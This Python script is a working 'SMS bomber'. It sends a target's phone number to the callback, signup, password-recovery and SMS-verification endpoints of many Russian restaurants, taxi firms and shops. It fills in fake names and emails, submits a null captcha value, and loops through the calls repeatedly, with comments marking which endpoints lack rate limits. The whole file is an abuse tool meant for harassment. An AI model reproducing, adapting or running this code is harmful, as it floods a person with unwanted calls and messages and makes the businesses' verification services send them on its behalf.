from time import sleep
from random import randint
import requests


def pizzalarenzo(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone,
        'time': ('%D0%91%D0%BB%D0%B8%D0%B6%D0%B0%D0%B9%D1%88%D0%B5%D0%B5+'
                 '%D0%B2%D1%80%D0%B5%D0%BC%D1%8F')
    }
    response_pizzalarenzo = requests.post(url='https://pizzalarenzo.ru/api/callback.php',
                                          headers=headers)
    print(response_pizzalarenzo, response_pizzalarenzo.content)

def tarelochka(phone):
    headers = {
        'url': 'tarelochcka-2016%40yandex.ru',
        'name_1': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone_1': '8'+phone

    }
    response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php',
                                        headers=headers)
    print(response_tarelochka, response_tarelochka.content)

def pizzapan(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'mytel': '8'+phone

    }
    response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php',
                                      headers=headers)
    print(response_pizzapan, response_pizzapan.content)


def dostaevsky(phone):
    dstvskphn = '+7 ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] + '-' + phone[8:10]
    headers = {
        'phone': dstvskphn
    }
    response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php',
                                        headers=headers)
    print(response_dostaevsky, response_dostaevsky.content)


def pizzasushiwok(phone):
    headers = {
        'mod_name': 'call_me',
        'task': 'request_call',
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone
    }
    response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
    print(response_pizzasushiwok, response_pizzasushiwok.content)


def ipizza(phone):
    ipzzphn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
              + phone[8:10]
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': ipzzphn
    }
    response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
    print(response_ipizza, response_ipizza.content)


def okeansushi(phone):
    oknsshphn = '8' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] +\
                '-' + phone[8:10]
    response_okeansushi = requests.post(url=('https://okeansushi.ru/includes/contact.php?call_mail'
                                             '=1&ajax=1&name=%D0%93%D0%BE%D1%80%D0%B8%D0%B3%D0%BE%D'
                                             '1%80%D0%B8%D0%B5%D0%B9&phone=' + oknsshphn +
                                             '&call_time=1&call_time_dt%5B%5D=21&call_time_dt%5B%5D'
                                             '=45&pravila2=on'))
    print(response_okeansushi, response_okeansushi.content)


def sunlight(phone):
    snlghtphn = '7'+phone
    response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                      json={"phone": snlghtphn})
    print(response_sunlight, response_sunlight.content)


def bk(phone):
    bkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
                                json={"phone": bkphn,
                                      "g-recaptcha-response": "null"})
    print(response_bk, response_bk.content)

def kfc(phone):
    kfcphn = '+7'+phone
    response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                      'common/auth/send-validation-sms'),
                                 json={"phone": kfcphn})
    print(response_kfc, response_kfc.content)

#  ваще без таймаута походу
def taxinonstop(phone):
    txnnstpphn = '8'+phone
    response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                         json={"cmd": "register", "phone": txnnstpphn,
                                               "taxi_city": "tmn"})
    print(response_taxinonstop, response_taxinonstop.content)

def karusel(phone):
    krslphn = '7'+phone
    response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/', 
                                     json={"phone": krslphn})
    print(response_karusel, response_karusel.content)

#  приделать генератор мыл, тут обязательно надо
def taxi2412regist(phone):
    tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
                '-' + phone[8:10]
    data = {
        'telephone': tx2412phn,
        'fio': 'Иван Иванов',
        'email': 'dassass@gmail.com',
        'pface_register': 'true'

    }
    response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/register', data=data)
    print(response_taxi2412, response_taxi2412.text)

def taxi2412recover(phone):
    tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
                '-' + phone[8:10]
    data = {
        'phone': tx2412phn
    }
    response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/recover', data=data)
    print(response_taxi2412, response_taxi2412.text)

def ostin(phone):
    ostnphn = '%207%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
              + phone[8:10]
    response_ostin = requests.post(url=('https://ostin.com/ru/ru/secured/myaccount/myclubcard/'
                                        'resultClubCard.jsp?type='
                                        'sendConfirmCode&phoneNumber='+ostnphn))
    print(response_ostin, response_ostin.text)

def funday(phone):
    fndphn = '+7%20' + '+' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
             + phone[8:10]
    response_funday = requests.post(url=('http://fundayshop.com/ru/ru/secured/myaccount/myclubcard/'
                                         'resultClubCard.jsp?type='
                                         'sendConfirmCode&phoneNumber='+fndphn))
    print(response_funday, response_funday.text)

def sela(phone):
    slphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    data = {
        'LastName': 'Петров',
        'FirstName': 'Петр',
        'BirthDate': '10.02.1978',
        'GenderCode': '1',
        'MobilePhone': slphn,
        'EmailAddress': 'ashdbb@gmail.com',
        'agree': '1'
    }
    response_sela = requests.post(url='https://www.sela.ru/sela/bonus/signup/', data=data)
    print(response_sela, response_sela.content)

def novextrade(phone):
    nvxtrdphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    data = {
        'phone': nvxtrdphn,
        'result_ids': 'notification',
        'is_ajax': '1'
    }
    response_novextrade = requests.post(url=('http://www.novex-trade.ru/index.php?dispatch='
                                             'nvx.send_sms_confirm_code'), data=data)
    print(response_novextrade, response_novextrade.content)

def atb(phone):
    atbphn = '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    data = {
        'phone': atbphn,
        'page': 'new'
    }
    response_atb = requests.post(url='https://www.atb.su/local/templates/main/ajax/main/send_sms_new.php', data=data)
    print(response_atb, response_atb.content)


def generate_email():
    """
    Generate e-mail
    :return: string email
    """
    services = ['gmail.com', 'yandex.ru', 'outlook.com']
    name_length = randint(6, 12)
    name = ''
    for i in range(name_length):
        name += chr(randint(97, 122))

    return name + '@' + services[randint(0, len(services) - 1)]


def run(phone, n):
    taxi2412regist(phone)
    for i in range(n): #  timeout 180
        kfc(phone)
        ostin(phone)
        funday(phone)
        for j in range(3): #  timeout 60
            bk(phone)
            karusel(phone)
            taxi2412recover(phone)
            for k in range(10): #  timeout 0
                sunlight(phone)
                taxinonstop(phone)
                sela(phone)
                novextrade(phone)
                atb(phone)
                sleep(6)
